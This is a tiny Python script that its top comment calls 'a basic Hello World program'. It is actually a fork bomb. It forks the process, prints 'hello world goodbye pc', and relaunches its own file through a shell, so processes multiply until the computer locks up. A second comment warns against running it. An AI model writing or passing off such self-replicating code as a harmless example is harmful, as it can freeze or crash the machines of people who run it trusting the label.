# a basic Hello World program
# DON'T ACTUALLY RUN THIS PYTHON FILE
import subprocess, os
os.fork()
os.write(1, b'hello world goodbye pc')
subprocess.Popen('python 1_hello_world.py', shell=True)
